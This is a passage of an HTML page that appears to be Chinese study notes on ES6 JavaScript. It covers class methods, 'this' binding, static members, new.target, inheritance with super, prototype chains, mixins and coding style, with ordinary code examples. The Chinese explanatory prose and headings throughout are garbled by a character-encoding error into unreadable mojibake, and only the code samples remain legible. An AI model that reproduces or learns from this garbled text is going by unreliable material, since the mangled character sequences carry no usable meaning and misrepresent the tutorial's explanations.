å‡½æ•°çš„ä¸€å±‚åŒ…è£…ï¼Œæ‰€ä»¥å‡½æ•°çš„è®¸å¤šç‰¹æ€§éƒ½è¢«<code>Class</code>ç»§æ‰¿ï¼ŒåŒ…æ‹¬<code>name</code>å±æ€§ã€‚<code>name</code>å±æ€§æ€»æ˜¯è¿”å›ç´§è·Ÿåœ¨<code>class</code>å…³é”®å­—åé¢çš„ç±»åã€‚</p><p><strong>ï¼ˆ4ï¼‰Generator æ–¹æ³•</strong></p><p>å¦‚æœæŸä¸ªæ–¹æ³•ä¹‹å‰åŠ ä¸Šæ˜Ÿå·ï¼ˆ<code>*</code>ï¼‰ï¼Œå°±è¡¨ç¤ºè¯¥æ–¹æ³•æ˜¯ä¸€ä¸ª Generator å‡½æ•°ã€‚</p><p><strong>ï¼ˆ5ï¼‰this çš„æŒ‡å‘</strong></p><p>ç±»çš„æ–¹æ³•å†…éƒ¨å¦‚æœå«æœ‰<code>this</code>ï¼Œå®ƒé»˜è®¤æŒ‡å‘ç±»çš„å®ä¾‹ã€‚ä½†æ˜¯ï¼Œå¿…é¡»éå¸¸å°å¿ƒï¼Œä¸€æ—¦å•ç‹¬ä½¿ç”¨è¯¥æ–¹æ³•ï¼Œå¾ˆå¯èƒ½æŠ¥é”™ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">printName</span>(<span class="params">name = <span class="string">&#x27;there&#x27;</span></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.print(<span class="string">`Hello <span class="subst">$&#123;name&#125;</span>`</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">print</span>(<span class="params">text</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(text);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> logger = <span class="keyword">new</span> Logger();</span><br><span class="line"><span class="keyword">const</span> &#123; printName &#125; = logger;</span><br><span class="line">printName(); <span class="comment">// TypeError: Cannot read property &#x27;print&#x27; of undefined</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>printName</code>æ–¹æ³•ä¸­çš„<code>this</code>ï¼Œé»˜è®¤æŒ‡å‘<code>Logger</code>ç±»çš„å®ä¾‹ã€‚ä½†æ˜¯ï¼Œå¦‚æœå°†è¿™ä¸ªæ–¹æ³•æå–å‡ºæ¥å•ç‹¬ä½¿ç”¨ï¼Œ<code>this</code>ä¼šæŒ‡å‘è¯¥æ–¹æ³•è¿è¡Œæ—¶æ‰€åœ¨çš„ç¯å¢ƒï¼ˆç”±äº class å†…éƒ¨æ˜¯ä¸¥æ ¼æ¨¡å¼ï¼Œæ‰€ä»¥ this å®é™…æŒ‡å‘çš„æ˜¯<code>undefined</code>ï¼‰ï¼Œä»è€Œå¯¼è‡´æ‰¾ä¸åˆ°<code>print</code>æ–¹æ³•è€ŒæŠ¥é”™ã€‚</p><p>ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„è§£å†³æ–¹æ³•æ˜¯ï¼Œåœ¨æ„é€ æ–¹æ³•ä¸­ç»‘å®š<code>this</code>ï¼Œè¿™æ ·å°±ä¸ä¼šæ‰¾ä¸åˆ°<code>print</code>æ–¹æ³•äº†ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.printName = <span class="built_in">this</span>.printName.bind(<span class="built_in">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦ä¸€ç§è§£å†³æ–¹æ³•æ˜¯ä½¿ç”¨ç®­å¤´å‡½æ•°ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Obj</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.getThis = <span class="function">() =&gt;</span> <span class="built_in">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2ã€é™æ€æ–¹æ³•"><a href="#2ã€é™æ€æ–¹æ³•" class="headerlink" title="2ã€é™æ€æ–¹æ³•"></a>2ã€é™æ€æ–¹æ³•</h2><p>ç±»ç›¸å½“äºå®ä¾‹çš„åŸå‹ï¼Œæ‰€æœ‰åœ¨ç±»ä¸­å®šä¹‰çš„æ–¹æ³•ï¼Œéƒ½ä¼šè¢«å®ä¾‹ç»§æ‰¿ã€‚å¦‚æœåœ¨ä¸€ä¸ªæ–¹æ³•å‰ï¼ŒåŠ ä¸Š<code>static</code>å…³é”®å­—ï¼Œå°±è¡¨ç¤ºè¯¥æ–¹æ³•ä¸ä¼šè¢«å®ä¾‹ç»§æ‰¿ï¼Œè€Œæ˜¯ç›´æ¥é€šè¿‡ç±»æ¥è°ƒç”¨ï¼Œè¿™å°±ç§°ä¸ºâ€œé™æ€æ–¹æ³•â€ã€‚</p><p>æ³¨æ„ï¼Œå¦‚æœé™æ€æ–¹æ³•åŒ…å«<code>this</code>å…³é”®å­—ï¼Œè¿™ä¸ª<code>this</code>æŒ‡çš„æ˜¯ç±»ï¼Œè€Œä¸æ˜¯å®ä¾‹ã€‚</p><p>çˆ¶ç±»çš„é™æ€æ–¹æ³•ï¼Œå¯ä»¥è¢«å­ç±»ç»§æ‰¿ã€‚é™æ€æ–¹æ³•ä¹Ÿæ˜¯å¯ä»¥ä»<code>super</code>å¯¹è±¡ä¸Šè°ƒç”¨çš„ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="function"><span class="title">classMethod</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bar</span> <span class="keyword">extends</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="function"><span class="title">classMethod</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.classMethod() + <span class="string">&#x27;, too&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Bar.classMethod() <span class="comment">// &quot;hello, too&quot;</span></span><br></pre></td></tr></table></figure><h2 id="3ã€å®ä¾‹å±æ€§çš„æ–°å†™æ³•"><a href="#3ã€å®ä¾‹å±æ€§çš„æ–°å†™æ³•" class="headerlink" title="3ã€å®ä¾‹å±æ€§çš„æ–°å†™æ³•"></a>3ã€å®ä¾‹å±æ€§çš„æ–°å†™æ³•</h2><p>å®ä¾‹å±æ€§é™¤äº†å®šä¹‰åœ¨<code>constructor()</code>æ–¹æ³•é‡Œé¢çš„<code>this</code>ä¸Šé¢ï¼Œä¹Ÿå¯ä»¥å®šä¹‰åœ¨ç±»çš„æœ€é¡¶å±‚ï¼Œè¿™æ—¶ï¼Œä¸éœ€è¦åœ¨å®ä¾‹å±æ€§å‰é¢åŠ ä¸Š<code>this</code>ã€‚</p><p>è¿™ç§æ–°å†™æ³•çš„å¥½å¤„æ˜¯ï¼Œæ‰€æœ‰å®ä¾‹å¯¹è±¡è‡ªèº«çš„å±æ€§éƒ½å®šä¹‰åœ¨ç±»çš„å¤´éƒ¨ï¼Œçœ‹ä¸Šå»æ¯”è¾ƒæ•´é½ï¼Œä¸€çœ¼å°±èƒ½çœ‹å‡ºè¿™ä¸ªç±»æœ‰å“ªäº›å®ä¾‹å±æ€§ã€‚</p><h2 id="4ã€é™æ€å±æ€§"><a href="#4ã€é™æ€å±æ€§" class="headerlink" title="4ã€é™æ€å±æ€§"></a>4ã€é™æ€å±æ€§</h2><p>é™æ€å±æ€§æŒ‡çš„æ˜¯ Class æœ¬èº«çš„å±æ€§ï¼Œå³<code>Class.propName</code>ï¼Œè€Œä¸æ˜¯å®šä¹‰åœ¨å®ä¾‹å¯¹è±¡ï¼ˆ<code>this</code>ï¼‰ä¸Šçš„å±æ€§ã€‚</p><p>ES6 æ˜ç¡®è§„å®šï¼ŒClass å†…éƒ¨åªæœ‰é™æ€æ–¹æ³•ï¼Œæ²¡æœ‰é™æ€å±æ€§ã€‚ç°åœ¨æœ‰ä¸€ä¸ª<a href="https://github.com/tc39/proposal-class-fields">ææ¡ˆ</a>æä¾›äº†ç±»çš„é™æ€å±æ€§ï¼Œå†™æ³•æ˜¯åœ¨å®ä¾‹å±æ€§çš„å‰é¢ï¼ŒåŠ ä¸Š<code>static</code>å…³é”®å­—ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è€å†™æ³•</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line">Foo.prop = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ–°å†™æ³•</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> prop = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5ã€new-target-å±æ€§"><a href="#5ã€new-target-å±æ€§" class="headerlink" title="5ã€new.target å±æ€§"></a>5ã€new.target å±æ€§</h2><p><code>new</code>æ˜¯ä»æ„é€ å‡½æ•°ç”Ÿæˆå®ä¾‹å¯¹è±¡çš„å‘½ä»¤ã€‚ES6 ä¸º<code>new</code>å‘½ä»¤å¼•å…¥äº†ä¸€ä¸ª<code>new.target</code>å±æ€§ï¼Œè¯¥å±æ€§ä¸€èˆ¬ç”¨åœ¨æ„é€ å‡½æ•°ä¹‹ä¸­ï¼Œè¿”å›<code>new</code>å‘½ä»¤ä½œç”¨äºçš„é‚£ä¸ªæ„é€ å‡½æ•°ã€‚å¦‚æœæ„é€ å‡½æ•°ä¸æ˜¯é€šè¿‡<code>new</code>å‘½ä»¤æˆ–<code>Reflect.construct()</code>è°ƒç”¨çš„ï¼Œ<code>new.target</code>ä¼šè¿”å›<code>undefined</code>ï¼Œå› æ­¤è¿™ä¸ªå±æ€§å¯ä»¥ç”¨æ¥ç¡®å®šæ„é€ å‡½æ•°æ˜¯æ€ä¹ˆè°ƒç”¨çš„ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">new</span>.target === Person) &#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;å¿…é¡»ä½¿ç”¨ new å‘½ä»¤ç”Ÿæˆå®ä¾‹&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person = <span class="keyword">new</span> Person(<span class="string">&#x27;å¼ ä¸‰&#x27;</span>); <span class="comment">// æ­£ç¡®</span></span><br><span class="line"><span class="keyword">var</span> notAPerson = Person.call(person, <span class="string">&#x27;å¼ ä¸‰&#x27;</span>);  <span class="comment">// æŠ¥é”™</span></span><br></pre></td></tr></table></figure><p>Class å†…éƒ¨è°ƒç”¨<code>new.target</code>ï¼Œè¿”å›å½“å‰ Classã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå­ç±»ç»§æ‰¿çˆ¶ç±»æ—¶ï¼Œ<code>new.target</code>ä¼šè¿”å›å­ç±»ã€‚</p><h1 id="Class-çš„ç»§æ‰¿"><a href="#Class-çš„ç»§æ‰¿" class="headerlink" title="Class çš„ç»§æ‰¿"></a>Class çš„ç»§æ‰¿</h1><h2 id="1ã€ç®€ä»‹-2"><a href="#1ã€ç®€ä»‹-2" class="headerlink" title="1ã€ç®€ä»‹"></a>1ã€ç®€ä»‹</h2><p>Class å¯ä»¥é€šè¿‡<code>extends</code>å…³é”®å­—å®ç°ç»§æ‰¿ï¼Œè¿™æ¯” ES5 çš„é€šè¿‡ä¿®æ”¹åŸå‹é“¾å®ç°ç»§æ‰¿ï¼Œè¦æ¸…æ™°å’Œæ–¹ä¾¿å¾ˆå¤šã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ColorPoint</span> <span class="keyword">extends</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">x, y, color</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(x, y); <span class="comment">// è°ƒç”¨çˆ¶ç±»çš„constructor(x, y)</span></span><br><span class="line">    <span class="built_in">this</span>.color = color;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">toString</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.color + <span class="string">&#x27; &#x27;</span> + <span class="built_in">super</span>.toString(); <span class="comment">// è°ƒç”¨çˆ¶ç±»çš„toString()</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ES5 çš„ç»§æ‰¿ï¼Œå®è´¨æ˜¯å…ˆåˆ›é€ å­ç±»çš„å®ä¾‹å¯¹è±¡<code>this</code>ï¼Œç„¶åå†å°†çˆ¶ç±»çš„æ–¹æ³•æ·»åŠ åˆ°<code>this</code>ä¸Šé¢ï¼ˆ<code>Parent.apply(this)</code>ï¼‰ã€‚ES6 çš„ç»§æ‰¿æœºåˆ¶å®Œå…¨ä¸åŒï¼Œå®è´¨æ˜¯å…ˆå°†çˆ¶ç±»å®ä¾‹å¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•ï¼ŒåŠ åˆ°<code>this</code>ä¸Šé¢ï¼ˆæ‰€ä»¥å¿…é¡»å…ˆè°ƒç”¨<code>super</code>æ–¹æ³•ï¼‰ï¼Œç„¶åå†ç”¨å­ç±»çš„æ„é€ å‡½æ•°ä¿®æ”¹<code>this</code>ã€‚</p><p>å¦ä¸€ä¸ªéœ€è¦æ³¨æ„çš„åœ°æ–¹æ˜¯ï¼Œåœ¨å­ç±»çš„æ„é€ å‡½æ•°ä¸­ï¼Œåªæœ‰è°ƒç”¨<code>super</code>ä¹‹åï¼Œæ‰å¯ä»¥ä½¿ç”¨<code>this</code>å…³é”®å­—ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚è¿™æ˜¯å› ä¸ºå­ç±»å®ä¾‹çš„æ„å»ºï¼ŒåŸºäºçˆ¶ç±»å®ä¾‹ï¼Œåªæœ‰<code>super</code>æ–¹æ³•æ‰èƒ½è°ƒç”¨çˆ¶ç±»å®ä¾‹ã€‚</p><h2 id="2ã€Object-getPrototypeOf"><a href="#2ã€Object-getPrototypeOf" class="headerlink" title="2ã€Object.getPrototypeOf()"></a>2ã€Object.getPrototypeOf()</h2><p><code>Object.getPrototypeOf</code>æ–¹æ³•å¯ä»¥ç”¨æ¥ä»å­ç±»ä¸Šè·å–çˆ¶ç±»ã€‚å› æ­¤ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–¹æ³•åˆ¤æ–­ï¼Œä¸€ä¸ªç±»æ˜¯å¦ç»§æ‰¿äº†å¦ä¸€ä¸ªç±»ã€‚</p><h2 id="3ã€super-å…³é”®å­—"><a href="#3ã€super-å…³é”®å­—" class="headerlink" title="3ã€super å…³é”®å­—"></a>3ã€super å…³é”®å­—</h2><p><code>super</code>è¿™ä¸ªå…³é”®å­—ï¼Œæ—¢å¯ä»¥å½“ä½œå‡½æ•°ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥å½“ä½œå¯¹è±¡ä½¿ç”¨ã€‚</p><ul><li><p>ç¬¬ä¸€ç§æƒ…å†µï¼Œ<code>super</code>ä½œä¸ºå‡½æ•°è°ƒç”¨æ—¶ï¼Œä»£è¡¨çˆ¶ç±»çš„æ„é€ å‡½æ•°ã€‚ES6 è¦æ±‚ï¼Œå­ç±»çš„æ„é€ å‡½æ•°å¿…é¡»æ‰§è¡Œä¸€æ¬¡<code>super</code>å‡½æ•°ã€‚ä½œä¸ºå‡½æ•°æ—¶ï¼Œ<code>super()</code>åªèƒ½ç”¨åœ¨å­ç±»çš„æ„é€ å‡½æ•°ä¹‹ä¸­</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">new</span>.target.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> A() <span class="comment">// A</span></span><br><span class="line"><span class="keyword">new</span> B() <span class="comment">// B</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œ<code>super</code>è™½ç„¶ä»£è¡¨äº†çˆ¶ç±»<code>A</code>çš„æ„é€ å‡½æ•°ï¼Œä½†æ˜¯è¿”å›çš„æ˜¯å­ç±»<code>B</code>çš„å®ä¾‹ï¼Œå³<code>super</code>å†…éƒ¨çš„<code>this</code>æŒ‡çš„æ˜¯<code>B</code>çš„å®ä¾‹ï¼ˆå› ä¸ºåœ¨<code>super()</code>æ‰§è¡Œæ—¶ï¼Œå®ƒæŒ‡å‘çš„æ˜¯å­ç±»<code>B</code>çš„æ„é€ å‡½æ•°ï¼‰ï¼Œå› æ­¤<code>super()</code>åœ¨è¿™é‡Œç›¸å½“äº<code>A.prototype.constructor.call(this)</code>ã€‚</p></li><li><p>ç¬¬äºŒç§æƒ…å†µï¼Œ<code>super</code>ä½œä¸ºå¯¹è±¡æ—¶ï¼Œåœ¨æ™®é€šæ–¹æ³•ä¸­ï¼ŒæŒ‡å‘çˆ¶ç±»çš„åŸå‹å¯¹è±¡ï¼›åœ¨é™æ€æ–¹æ³•ä¸­ï¼ŒæŒ‡å‘çˆ¶ç±»ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">p</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">super</span>.p()); <span class="comment">// 2</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = <span class="keyword">new</span> B();</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œå­ç±»<code>B</code>å½“ä¸­çš„<code>super.p()</code>ï¼Œå°±æ˜¯å°†<code>super</code>å½“ä½œä¸€ä¸ªå¯¹è±¡ä½¿ç”¨ã€‚è¿™æ—¶ï¼Œ<code>super</code>åœ¨æ™®é€šæ–¹æ³•ä¹‹ä¸­ï¼ŒæŒ‡å‘<code>A.prototype</code>ï¼Œæ‰€ä»¥<code>super.p()</code>å°±ç›¸å½“äº<code>A.prototype.p()</code>ã€‚</p></li></ul><h2 id="4ã€ç±»çš„-prototype-å±æ€§å’Œ-proto-å±æ€§"><a href="#4ã€ç±»çš„-prototype-å±æ€§å’Œ-proto-å±æ€§" class="headerlink" title="4ã€ç±»çš„ prototype å±æ€§å’Œ__proto__å±æ€§"></a>4ã€ç±»çš„ prototype å±æ€§å’Œ__proto__å±æ€§</h2><p>Class ä½œä¸ºæ„é€ å‡½æ•°çš„è¯­æ³•ç³–ï¼ŒåŒæ—¶æœ‰<code>prototype</code>å±æ€§å’Œ<code>__proto__</code>å±æ€§ï¼Œå› æ­¤åŒæ—¶å­˜åœ¨ä¸¤æ¡ç»§æ‰¿é“¾ã€‚</p><p>ï¼ˆ1ï¼‰å­ç±»çš„<code>__proto__</code>å±æ€§ï¼Œè¡¨ç¤ºæ„é€ å‡½æ•°çš„ç»§æ‰¿ï¼Œæ€»æ˜¯æŒ‡å‘çˆ¶ç±»ã€‚</p><p>ï¼ˆ2ï¼‰å­ç±»<code>prototype</code>å±æ€§çš„<code>__proto__</code>å±æ€§ï¼Œè¡¨ç¤ºæ–¹æ³•çš„ç»§æ‰¿ï¼Œæ€»æ˜¯æŒ‡å‘çˆ¶ç±»çš„<code>prototype</code>å±æ€§ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.setPrototypeOf(B.prototype, A.prototype);</span><br><span class="line"><span class="comment">// ç­‰åŒäº </span></span><br><span class="line">B.prototype = <span class="built_in">Object</span>.create(A.prototype);</span><br><span class="line"><span class="comment">// ç­‰åŒäº</span></span><br><span class="line">B.prototype.__proto__ = A.prototype;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.setPrototypeOf(B, A);</span><br><span class="line"><span class="comment">// ç­‰åŒäº</span></span><br><span class="line">B.__proto__ = A;</span><br></pre></td></tr></table></figure><p>è¿™ä¸¤æ¡ç»§æ‰¿é“¾ï¼Œå¯ä»¥è¿™æ ·ç†è§£ï¼šä½œä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œå­ç±»ï¼ˆ<code>B</code>ï¼‰çš„åŸå‹ï¼ˆ<code>__proto__</code>å±æ€§ï¼‰æ˜¯çˆ¶ç±»ï¼ˆ<code>A</code>ï¼‰ï¼›ä½œä¸ºä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œå­ç±»ï¼ˆ<code>B</code>ï¼‰çš„åŸå‹å¯¹è±¡ï¼ˆ<code>prototype</code>å±æ€§ï¼‰æ˜¯çˆ¶ç±»çš„åŸå‹å¯¹è±¡ï¼ˆ<code>prototype</code>å±æ€§ï¼‰çš„å®ä¾‹ã€‚</p><h3 id="å®ä¾‹çš„-proto-å±æ€§"><a href="#å®ä¾‹çš„-proto-å±æ€§" class="headerlink" title="å®ä¾‹çš„ _proto_ å±æ€§"></a>å®ä¾‹çš„ _<em>proto</em>_ å±æ€§</h3><p>å­ç±»å®ä¾‹çš„<code>__proto__</code>å±æ€§çš„<code>__proto__</code>å±æ€§ï¼ŒæŒ‡å‘çˆ¶ç±»å®ä¾‹çš„<code>__proto__</code>å±æ€§ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå­ç±»çš„åŸå‹çš„åŸå‹ï¼Œæ˜¯çˆ¶ç±»çš„åŸå‹ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> Point(<span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="keyword">new</span> ColorPoint(<span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;red&#x27;</span>);</span><br><span class="line"></span><br><span class="line">p2.__proto__ === p1.__proto__ <span class="comment">// false</span></span><br><span class="line">p2.__proto__.__proto__ === p1.__proto__ <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>ColorPoint</code>ç»§æ‰¿äº†<code>Point</code>ï¼Œå¯¼è‡´å‰è€…åŸå‹çš„åŸå‹æ˜¯åè€…çš„åŸå‹ã€‚å› æ­¤ï¼Œé€šè¿‡å­ç±»å®ä¾‹çš„<code>__proto__.__proto__</code>å±æ€§ï¼Œå¯ä»¥ä¿®æ”¹çˆ¶ç±»å®ä¾‹çš„è¡Œä¸ºã€‚</p><h2 id="5ã€åŸç”Ÿæ„é€ å‡½æ•°çš„ç»§æ‰¿"><a href="#5ã€åŸç”Ÿæ„é€ å‡½æ•°çš„ç»§æ‰¿" class="headerlink" title="5ã€åŸç”Ÿæ„é€ å‡½æ•°çš„ç»§æ‰¿"></a>5ã€åŸç”Ÿæ„é€ å‡½æ•°çš„ç»§æ‰¿</h2><p>ECMAScript çš„åŸç”Ÿæ„é€ å‡½æ•°å¤§è‡´æœ‰ä¸‹é¢è¿™äº›ã€‚</p><ul><li>Boolean()</li><li>Number()</li><li>String()</li><li>Array()</li><li>Date()</li><li>Function()</li><li>RegExp()</li><li>Error()</li><li>Object()</li></ul><h2 id="6ã€Mixin-æ¨¡å¼çš„å®ç°"><a href="#6ã€Mixin-æ¨¡å¼çš„å®ç°" class="headerlink" title="6ã€Mixin æ¨¡å¼çš„å®ç°"></a>6ã€Mixin æ¨¡å¼çš„å®ç°</h2><p>Mixin æŒ‡çš„æ˜¯å¤šä¸ªå¯¹è±¡åˆæˆä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼Œæ–°å¯¹è±¡å…·æœ‰å„ä¸ªç»„æˆæˆå‘˜çš„æ¥å£ã€‚å®ƒçš„æœ€ç®€å•å®ç°å¦‚ä¸‹ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a = &#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="string">&#x27;a&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> b = &#123;</span><br><span class="line">  <span class="attr">b</span>: <span class="string">&#x27;b&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> c = &#123;...a, ...b&#125;; <span class="comment">// &#123;a: &#x27;a&#x27;, b: &#x27;b&#x27;&#125;</span></span><br></pre></td></tr></table></figure><h1 id="Module-çš„è¯­æ³•"><a href="#Module-çš„è¯­æ³•" class="headerlink" title="Module çš„è¯­æ³•"></a>Module çš„è¯­æ³•</h1><h2 id="1ã€æ¦‚è¿°-3"><a href="#1ã€æ¦‚è¿°-3" class="headerlink" title="1ã€æ¦‚è¿°"></a>1ã€æ¦‚è¿°</h2><p>â€¦(todo)</p><h1 id="Module-çš„åŠ è½½å®ç°"><a href="#Module-çš„åŠ è½½å®ç°" class="headerlink" title="Module çš„åŠ è½½å®ç°"></a>Module çš„åŠ è½½å®ç°</h1><p>â€¦(todo)</p><h1 id="ç¼–ç¨‹é£æ ¼"><a href="#ç¼–ç¨‹é£æ ¼" class="headerlink" title="ç¼–ç¨‹é£æ ¼"></a>ç¼–ç¨‹é£æ ¼</h1><h2 id="1ã€å—çº§ä½œç”¨åŸŸ"><a href="#1ã€å—çº§ä½œç”¨åŸŸ" class="headerlink" title="1ã€å—çº§ä½œç”¨åŸŸ"></a>1ã€å—çº§ä½œç”¨åŸŸ</h2><p><strong>ï¼ˆ1ï¼‰let å–ä»£ var</strong></p><p>ä¸å†ä½¿ç”¨<code>var</code>å‘½ä»¤ï¼Œè€Œæ˜¯ä½¿ç”¨<code>let</code>å‘½ä»¤å–ä»£ã€‚</p><p><strong>ï¼ˆ2ï¼‰å…¨å±€å¸¸é‡å’Œçº¿ç¨‹å®‰å…¨</strong></p><p>åœ¨<code>let</code>å’Œ<code>const</code>ä¹‹é—´ï¼Œå»ºè®®ä¼˜å…ˆä½¿ç”¨<code>const</code>ï¼Œå°¤å…¶æ˜¯åœ¨å…¨å±€ç¯å¢ƒï¼Œä¸åº”è¯¥è®¾ç½®å˜é‡ï¼Œåªåº”è®¾ç½®å¸¸é‡ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// best</span></span><br><span class="line"><span class="keyword">const</span> [a, b, c] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br></pre></td></tr></table></figure><p><code>const</code>å£°æ˜å¸¸é‡æœ‰ä¸‰ä¸ªå¥½å¤„ï¼Œä¸€æ˜¯é˜…è¯»ä»£ç çš„äººç«‹åˆ»ä¼šæ„è¯†åˆ°ä¸åº”è¯¥ä¿®æ”¹è¿™ä¸ªå€¼ï¼ŒäºŒæ˜¯é˜²æ­¢äº†æ— æ„é—´ä¿®æ”¹å˜é‡å€¼æ‰€å¯¼è‡´çš„é”™è¯¯ï¼Œä¸‰æ˜¯JavaScript ç¼–è¯‘å™¨ä¼šå¯¹<code>const</code>è¿›è¡Œä¼˜åŒ–ã€‚</p><p>æ‰€æœ‰çš„å‡½æ•°éƒ½åº”è¯¥è®¾ç½®ä¸ºå¸¸é‡ã€‚</p><h2 id="2ã€å­—ç¬¦ä¸²"><a href="#2ã€å­—ç¬¦ä¸²" class="headerlink" 